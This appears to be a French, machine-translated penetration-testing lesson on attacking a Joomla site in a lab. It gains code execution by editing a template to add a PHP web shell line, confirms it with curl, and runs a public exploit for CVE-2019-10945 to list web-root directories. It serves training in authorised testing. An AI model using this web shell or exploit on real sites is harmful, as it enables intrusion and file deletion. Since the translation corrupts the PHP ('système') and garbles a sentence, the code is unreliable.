Attaquer Joomla
================

* * * * *

Nous savons désormais que nous avons affaire à un site e-commerce Joomla. Si nous pouvons y accéder, nous pourrons peut-être atterrir dans l'environnement interne du client et commencer à énumérer l'environnement de domaine interne. Comme WordPress et Drupal, Joomla a eu sa juste part de vulnérabilités contre l'application principale et les extensions vulnérables. De plus, comme les autres, il est possible d'obtenir l'exécution de code à distance si nous pouvons nous connecter au backend d'administration.

* * * * *

Abus des fonctionnalités intégrées
------------------------------

Au cours de la phase d'énumération Joomla et de la recherche générale de données d'entreprise, nous pouvons rencontrer des informations d'identification divulguées que nous pouvons utiliser à nos fins. En utilisant les informations d'identification que nous avons obtenues dans les exemples de la dernière section, `admin:admin`, connectons-nous au backend cible à `http://dev.inlanefreight.local/administrator`. Une fois connecté, nous pouvons voir de nombreuses options qui s'offrent à nous. Pour nos besoins, nous aimerions ajouter un extrait de code PHP pour gagner RCE. Nous pouvons le faire en personnalisant un modèle.

![](https://academy.hackthebox.com/storage/modules/113/joomla_admin.png)

À partir de là, nous pouvons cliquer sur `Modèles` en bas à gauche sous `Configuration` pour afficher le menu des modèles.

![](https://academy.hackthebox.com/storage/modules/113/joomla_templates.png)

Ensuite, nous pouvons cliquer sur un nom de modèle. Choisissons `protostar` sous l'en-tête de colonne `Template` . Cela nous amènera à la page `Modèles : Personnaliser` .

![](https://academy.hackthebox.com/storage/modules/113/joomla_customise.png)

Enfin, nous pouvons cliquer sur une page pour afficher la source de la page. C'est une bonne idée de prendre l'habitude d'utiliser des noms de fichiers et des paramètres non standard pour nos shells Web afin de ne pas les rendre facilement accessibles à un attaquant "drive-by" lors de l'évaluation. Nous pouvons également protéger par mot de passe et même limiter l'accès à notre adresse IP source. De plus, nous devons toujours nous rappeler de nettoyer les shells Web dès que nous en avons fini avec eux, mais toujours inclure le nom du fichier, le hachage du fichier et l'emplacement dans notre rapport final au client.

Choisissons la page `error.php` . Nous allons ajouter une ligne PHP pour obtenir l'exécution du code comme suit.

Code : php

```
système($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

```

![](https://academy.hackthebox.com/storage/modules/113/joomla_edited.png)

Une fois cela fait, cliquez sur `Enregistrer et fermer` en haut et confirmez l'exécution du code à l'aide de `cURL`.

```
dsgsec@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

À partir de là, nous pouvons passer à un shell inversé interactif et commencer à rechercher des vecteurs locaux d'escalade de privilèges ou nous concentrer sur les mouvements latéraux au sein du réseau d'entreprise. Nous devons nous assurer, encore une fois, de noter ce changement pour nos annexes de rapport et de faire tout notre possible pour supprimer l'extrait de code PHP de la page `error.php` .

* * * * *

Tirer parti des vulnérabilités connues
--------------------------------

Au moment de la rédaction de cet article, [426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) des vulnérabilités liées à Joomla ont reçu des CVE. Cependant, ce n'est pas parce qu'une vulnérabilité a été divulguée et a reçu un CVE qu'elle est exploitable ou qu'un exploit PoC public fonctionnel est disponible. Comme avec WordPress, les vulnérabilités critiques (telles que celles d'exécution de code à distance) qui affectent le noyau de Joomla sont rares. La recherche sur un site tel que `exploit-db` affiche plus de 1 400 entrées pour Joomla, la grande majorité étant des extensions Joomla.

Examinons une vulnérabilité du cœur de Joomla qui affecte la version `3.9.4`, que notre cible `http://dev.inlanefreight.local/` a été trouvée en cours d'exécution lors de notre énumération. En consultant la page Joomla [téléchargements](https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html), nous pouvons voir que `3.9.4` a été publié en mars 2019. Bien qu'elle soit obsolète car nous sommes sur Joomla `4.0.3` en septembre 2021, il est tout à fait possible de rencontrer cette version lors d'une évaluation, en particulier contre une grande entreprise qui peut ne pas maintenir un bon l'inventaire des applications et ignore son existence.

En recherchant un peu, nous constatons que cette version de Joomla est probablement vulnérable à [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) qui est une vulnérabilité de traversée de répertoire et de suppression de fichier authentifiée. Nous pouvons utiliser [ce](https://www.exploit-db.com/exploits/46710) script d'exploitation pour exploiter la vulnérabilité et répertorier le contenu de la racine Web et d'autres répertoires. La version python3 de ce même script est disponible [ici](https://github.com/dpgg101/CVE-2019-10945). Nous pouvons également l'utiliser pour supprimer des fichiers (non recommandé). Cela pourrait conduire à l'accès à des fichiers sensibles tels qu'un fichier de configuration ou un script contenant des informations d'identification si nous pouvons ensuite y accéder via l'URL de l'application. Un attaquant pourrait également causer des dommages en supprimant les fichiers nécessaires si nousl'utilisateur bserver dispose des autorisations appropriées.

Nous pouvons exécuter le script en spécifiant les indicateurs `--url`, `--username`, `--password` et `--dir` . En tant que pentesters, cela ne nous serait utile que si le portail de connexion admin n'est pas accessible de l'extérieur puisque, armés de creds admin, nous pouvons obtenir l'exécution de code à distance, comme nous l'avons vu plus haut.

```
dsgsec@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /

# Titre de l'exploit : Joomla Core (1.5.0 à 3.9.4) - Traversée de répertoires et suppression arbitraire de fichiers authentifiée
# Site Web : Haboob.sa
# Courriel : research@haboob.sa
# Versions : Joomla 1.5.0 à Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945
  _ _ ____ ____ ____ ____
| | | | /\ | _ \ / __ \ / __ \| _\
| |__| | / \ | |_) | | | | | | | |_) |
| __ | / /\ \ | _ <| | | | | | | _ <
| | | |/ ____ \| |_) | |__| | |__| | |_) |
|_| |_/_/ \_\____/ \____/ \____/|____/

administrateur
poubelle
cache
cli
Composants
images
comprend
langue
mises en page
bibliothèques
médias
modules
plugins
modèles
tmp
LICENCE.txt
LISEZMOI.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt

```

* * * * *

Passer à autre chose
---------

Ensuite, jetons un coup d'œil à Drupal, qui, bien qu'il détienne une part beaucoup plus petite du marché des CMS, est toujours utilisé par des entreprises du monde entier.